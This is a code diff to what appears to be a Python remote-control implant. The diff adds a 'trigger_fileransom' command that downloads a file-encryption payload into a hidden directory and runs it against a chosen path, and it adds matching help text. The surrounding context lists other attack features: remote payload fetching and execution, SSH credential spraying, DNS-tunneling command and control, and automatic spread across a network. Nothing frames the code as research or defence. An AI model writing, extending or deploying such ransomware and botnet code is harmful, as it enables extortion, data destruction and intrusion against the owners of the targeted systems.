@@ -384,7 +384,50 @@ def handle_trigger(cmd):
         fetch_payload("forensics_check.py")
         print("[+] Checking for forensic artifacts")
         return run_payload("forensics_check.py")
-
+    
+    # === FILE ENCRYPTION PAYLOAD ===
+    
+    elif cmd.startswith("trigger_fileransom"):
+        """File encryption/decryption ransomware"""
+        parts = cmd.split()
+        if len(parts) < 2:
+            return "[!] Usage: trigger_fileransom <encrypt/decrypt> <path> [password]"
+        
+        action = parts[1]
+        fetch_payload("fileransom.py")
+        
+        # Build command for the payload
+        payload_path = os.path.join(HIDDEN_DIR, "fileransom.py")
+        
+        if action == "encrypt":
+            if len(parts) >= 3:
+                target = parts[2]
+                cmd_args = f"encrypt \"{target}\""
+            else:
+                cmd_args = "encrypt"
+            
+            # Optional custom password
+            if len(parts) >= 4:
+                password = parts[3]
+                cmd_args += f" --custom-password \"{password}\""
+            
+            print(f"[+] Starting file encryption")
+            return subprocess.getoutput(f"python3 \"{payload_path}\" {cmd_args}")
+        
+        elif action == "decrypt":
+            if len(parts) < 4:
+                return "[!] Usage: trigger_fileransom decrypt <path> <password>"
+            
+            target = parts[2]
+            password = parts[3]
+            cmd_args = f"decrypt \"{target}\" --password \"{password}\""
+            
+            print(f"[+] Starting file decryption")
+            return subprocess.getoutput(f"python3 \"{payload_path}\" {cmd_args}")
+        
+        else:
+            return "[!] Unknown action. Use 'encrypt' or 'decrypt'"
+    
     # === COMPOUND TRIGGERS ===
     
     elif cmd == "trigger_full_recon":
@@ -543,6 +586,10 @@ PAYLOAD EXECUTION:
   trigger_sshspray        - SSH credential spraying
   trigger_dnstunnel       - DNS tunneling C2
   trigger_autodeploy      - Auto-deploy to network
+
+FILE ENCRYPTION:
+  trigger_fileransom encrypt <path> [password] - Encrypt files
+  trigger_fileransom decrypt <path> <password> - Decrypt files
 
 COMPOUND OPERATIONS:
   trigger_full_recon      - Execute full reconnaissance suite
